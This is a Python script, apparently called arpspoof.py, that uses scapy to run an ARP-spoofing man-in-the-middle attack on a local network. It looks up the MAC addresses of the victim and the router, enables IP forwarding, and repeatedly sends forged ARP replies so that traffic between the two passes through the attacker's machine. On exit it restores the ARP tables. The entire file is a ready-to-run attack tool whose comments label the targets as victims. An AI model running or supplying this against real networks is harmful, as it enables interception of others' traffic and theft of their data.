import sys
from scapy.all import ARP, Ether, srp, sendp, get_if_hwaddr
import time

def get_mac(ip):    
    try:
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcast MAC address
        arp = ARP(pdst=ip)  # ARP request
        result = srp(ether/arp, timeout=3, verbose=False)[0]    # Send the packet and receive the response in an ethernet frame
        return result[0][1].hwsrc   # Extract the MAC address from the response
    except:
        print(f"ERROR: Failed to get MAC address for {ip}")
        sys.exit(1)

def spoof(target_ip, spoof_ip, target_mac, attacker_mac):   
    # Create the poisoned ARP packet
    packet = Ether(src=attacker_mac, dst=target_mac)/ARP(   # Ethernet frame with ARP packet
        hwsrc=attacker_mac, #Set Aattacker MAC as source, looks like the packet is coming from the router
        psrc=spoof_ip,  # This is the IP the Attacker is claiming to be (router)
        hwdst=target_mac,   
        pdst=target_ip,
        op=2    # ARP reply
    )
    
    # Send the packet at layer 2
    sendp(packet, verbose=False, iface="eth0")

def restore(target_ip, source_ip, target_mac, source_mac):  # Restore the ARP table to its original state
    # Create the restoration packet
    packet = Ether(src=source_mac, dst=target_mac)/ARP( 
        hwsrc=source_mac,
        psrc=source_ip,
        hwdst=target_mac,
        pdst=target_ip,
        op=2
    )
    
    # Send the packet at layer 2
    sendp(packet, count=4, verbose=False, iface="eth0")

def enable_ip_forward():    
    # Enable IP forwarding so the attacker can forward packets between the victim and the router (done here so the user doesn't have to do it manually)
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write('1')

def main():
    if len(sys.argv) != 3:
        print("Usage: sudo python3 arpspoof.py <Victim_IP> <Router_IP>")
        sys.exit(1)

    victim_ip = sys.argv[1]
    router_ip = sys.argv[2]
    interface = "eth0"  # Using eth0 directly for simplicity

    try:
        # Enable IP forwarding
        enable_ip_forward()
        print("-- Enabled IP forwarding")

        print("-- Getting MAC addresses...")
        attacker_mac = get_if_hwaddr(interface)
        victim_mac = get_mac(victim_ip)
        router_mac = get_mac(router_ip)
        
        print(f"-- Interface: {interface}")
        print(f"-- My MAC: {attacker_mac}")
        print(f"-- Victim's MAC: {victim_mac}")
        print(f"-- Router's MAC: {router_mac}")
        
        packets_sent = 0
        print("--! Starting ARP spoofing... Press CTRL+C to stop.")
        
        while True:
            # Tell victim we are the router
            spoof(victim_ip, router_ip, victim_mac, attacker_mac)
            # Tell router we are the victim
            spoof(router_ip, victim_ip, router_mac, attacker_mac)
            
            packets_sent += 2
            print(f"\r-- Packets sent: {packets_sent}", end="", flush=True)
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n!-- CTRL+C Pressed. Restoring ARP tables...")
        restore(victim_ip, router_ip, victim_mac, router_mac)
        restore(router_ip, victim_ip, router_mac, victim_mac)
        print("-- ARP tables restored. Exiting.")
    except Exception as e:
        print(f"\n An error occurred: {e}")
        try:
            restore(victim_ip, router_ip, victim_mac, router_mac)
            restore(router_ip, victim_ip, router_mac, victim_mac)
            print("-- ARP tables restored. Exiting.")
        except:
            print("ERROR: Failed to restore ARP tables")
        sys.exit(1)

if __name__ == "__main__":
    main()
